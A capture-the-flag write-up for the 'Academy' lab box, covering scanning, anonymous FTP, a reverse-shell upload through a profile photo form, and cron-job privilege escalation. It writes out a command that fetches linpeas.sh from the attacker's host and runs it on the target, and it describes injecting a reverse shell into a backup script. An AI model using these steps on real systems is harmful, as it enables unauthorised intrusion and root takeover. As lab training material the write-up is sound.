# 🏫 Academy CTF

link to download the box: [https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH](https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH)

Credentials to retrieve the IP of the machine:

Username: root

Password: tcm

### Introduction:

The objective is to gain root access to the target system. The writeup will be less graphic and detailed in order for you to try to bypass possible problems and look for in depth resources.

### Step 1: Nmap Scan

Commencing the engagement with a meticulous Nmap scan provides insights into the target system's network topology, open ports, and active services.

```bash
nmap -sC -sV <target_ip>
```

### Step 2: FTP Port and Anonymous Login

Identifying an accessible FTP port, we leverage anonymous login credentials to retrieve a notable file, note.txt.

```bash
ftp <target_ip>
ls
get note.txt
```

### Step 3: Gobuster Discovery

Utilizing Gobuster facilitates the discovery of hidden directories on the web server, revealing /academy and /phpmyadmin.

```bash
gobuster dir -u http://<target_ip> -w <wordlist>
```

### Step 4: Cracking Hashed Password

Analysis of note.txt discloses student credentials and a hashed password, subsequently decrypted to reveal "student."

### Step 5: Web Application Exploitation

Logging in as the student reveals a myprofile page with an upload photo feature. We exploit this functionality by uploading a reverse shell, pre-configuring a local listener.

### Step 6: Privilege Escalation with Linpeas

To identify potential privilege escalation opportunities, Linpeas is downloaded locally and served via a Python web server. Subsequently, it is fetched on the target machine.

```bash
cd /tmp
wget http://<local_machine_ip>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Step 7: Identifying Privesc Opportunity

Linpeas reveals a noteworthy cron job: `/home/grimmie/backup.sh`. Furthermore, a MySQL password is extracted from the script.

### Step 8: SSH Access as Admin User

Access to the system is escalated by successfully SSHing into the admin account "grimmie" using the identified credentials.

```bash
ssh grimmie@<target_ip>
```

### Step 9: Investigating Cron Job

The backup.sh script is examined, uncovering references to a process snooping tool named psypy. The tool is then downloaded, transferred to the target machine, and executed for process monitoring.

### Step 10: Exploiting Cron Job

Identification of a cron job running every minute prompts the injection of a reverse shell payload into the backup.sh script, enabling remote access.

### Step 11: Obtaining Root Access

Post-exploitation, a flag.txt file is discovered, culminating in the successful rooting of the target system.

```bash
cat flag.txt
```

### Conclusion:

Congrat's on rooting this machine, see you in the next one

Happy hacking!
